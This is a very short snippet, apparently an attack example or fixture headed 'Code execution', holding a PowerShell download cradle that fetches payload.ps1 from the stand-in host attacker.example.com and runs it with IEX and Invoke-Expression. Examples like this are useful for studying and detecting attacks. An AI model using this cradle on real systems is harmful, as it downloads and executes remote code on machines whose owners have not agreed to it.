# Code execution
IEX (New-Object Net.WebClient).DownloadString("https://attacker.example.com/payload.ps1")
Invoke-Expression $script
